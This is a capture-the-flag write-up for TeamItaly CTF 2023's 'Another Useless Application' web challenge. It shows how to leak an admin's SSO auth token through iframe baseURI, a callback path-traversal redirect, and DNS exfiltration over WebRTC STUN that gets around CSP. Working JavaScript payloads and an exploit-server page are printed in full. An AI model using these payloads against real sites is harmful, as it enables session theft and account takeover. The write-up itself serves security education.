# TeamItaly CTF 2023

## [web] ᴬnother ᵤseless ᴬpplication (2 solves)

## Overview

The application is a useless website, the only features available are:  
- log in and register through an external sso  
- set your profile description as HTML in a sandboxed iframe  
- check the descriptions of public users

The flag is in the profile description of the admin.

The profile description is sandboxed inside an iframe like this:  
```html  
<iframe sandbox="allow-scripts" srcdoc="<%= profile.desc %>"></iframe>  
```

Moreover, inside the iframe, the following CSP applies (inherited from the
parent document):

```http  
Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'
https://cdn.jsdelivr.net/; style-src 'unsafe-inline'
https://cdn.jsdelivr.net/; img-src data: ; connect-src 'self'  
```

### Location leak

Even if we are in a sandboxed iframe, and we can't access directly the
location of the parent document, we can still leak the full URL of the parent
document accessing the *baseURI* variable like this:

```html  
<svg onload="console.log(baseURI)">  
```

*baseURI* also includes the URL fragment, if we are able to change the callback of the sso to our exploit, we could leak a valid authentication code of the admin.

### Redirect

The callback URL is checked by the following code:

```js  
host.startsWith(`${CHALL_URL}/cb`)  
```

We can manipulate the callback value to force a redirection to our profile
like this:

```  
http://sso.aua.challs.teamitaly.eu/login?callback=http://site.aua.challs.teamitaly.eu/cb/../profile?user=aaaaa  
```

When the admin bot visits this link, it will redirect to the profile of user
*aaaaa* with a valid authentication token in the fragment.

### Leak

Now we are able to access the auth token of the admin, we only need a way to
leak it to us.

Because of the presence of the CSP, we can't simply use a webhook to leak
information.

However, we can still use DNS exfiltration abusing the RTC protocol, using
this payload:

```js  
(async()=>{p=new RTCPeerConnection({iceServers:[{urls:
"stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await
p.createOffer())})()  
```

### Exploit

#### Profile payload

First of all, we need to register a user and set its profile to a payload
similar to this, leaking the fragment of the parent URL and leaking it to the
DNS bin.

```html  
<script>  
function asciitoHex(ascii){  
res = ''  
for (var n = 0; n < ascii.length; n ++) {  
 res += Number(ascii.charCodeAt(n)).toString(16);

}return res;}  
</script>  
<svg onload="(async()=>{p=new RTCPeerConnection({iceServers:[{urls:
'stun:'+asciitoHex(baseURI.split('#')[1])+'.your.dns.bin.test'}]});p.createDataChannel('');p.setLocalDescription(await
p.createOffer())})()">  
```

#### Exploit server

First of all we need the bot to log into the real application (as it's only
logged in the sso).

Then, we can redirect the bot to the `/login` endpoint of the sso with the
callback to the profile of our user.

```html  
<script>  
 // login the admin in the app  
 w = window.open('http://site.aua.challs.teamitaly.eu/login')

 explurl =
'http://sso.aua.challs.teamitaly.eu/login?callback=http://site.aua.challs.teamitaly.eu/cb/../profile?user=aaaaa'  
  
 setTimeout(()=>{location = explurl}, 1000)  
</script>  
```

After the attack, we will leak the authentication token in the DNS bin, we can
use the token to access the app as the admin and retrieve the flag.

Original writeup
(https://github.com/TeamItaly/TeamItalyCTF-2023/blob/master/AnotherUselessApplication/README.md).